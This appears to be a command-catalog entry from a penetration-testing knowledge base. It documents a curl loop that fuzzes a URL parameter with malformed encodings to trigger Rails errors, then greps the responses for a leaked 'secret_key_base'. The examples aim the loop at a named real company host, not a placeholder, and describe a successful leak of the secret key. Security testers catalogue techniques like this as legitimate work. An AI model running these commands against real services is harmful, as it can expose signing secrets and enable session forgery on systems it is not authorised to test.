---
data: 'curl -v "https://target.com/endpoint?param=$ENCODED_PAYLOAD" -o response.html'
tags:
  - fuzzing
  - web
  - recon
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:18.276Z'
id: 3182bae9-9a7c-476d-bf84-52124db4b7be
verified: false
validated: true
submitted: true
---
# curl-fuzz-encoded-parameter

## Command

```bash
curl -v "https://target.com/endpoint?param=$ENCODED_PAYLOAD" -o response.html
egrep -i "secret_key_base" response.html
```

## Description

This command uses curl to send an HTTP GET request with a fuzzed, encoded parameter to a web endpoint, capturing verbose output and saving the response for analysis. It's designed for testing error triggers in web applications like Ruby on Rails, where malformed inputs may leak sensitive data such as secret keys.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-v` | Verbose mode to show request/response details | Yes |
| `URL` | Target endpoint with parameter (e.g., https://customers.gitlab.com/endpoint?param=) | Yes |
| `$ENCODED_PAYLOAD` | Encoded string to fuzz (e.g., %C3%81, \xFF) | Yes |
| `-o response.html` | Output file for response body | Yes |
| `egrep` | Grep for key patterns in output | No |

## Examples

### Basic Usage

```bash
curl -v "https://customers.gitlab.com/endpoint?param=test" -o baseline.html
```

### Advanced Usage

```bash
for payload in '%C3%81' '\xFF' 'base64:invalid'; do
  curl -v "https://customers.gitlab.com/endpoint?param=$payload" -o resp_$payload.html
echo "Checking $payload:"; egrep -i "secret_key_base" resp_$payload.html
done
```

## Expected Output

Verbose curl output showing HTTP request headers, followed by a 500 error response body in response.html containing stack traces. Successful leak appears as lines like "secret_key_base: a1b2c3d4..." in the grep results.

## Related

- [[Related Procedure: Fuzz-Parameters-to-Leak-Rails-Secret-Key-Base]]
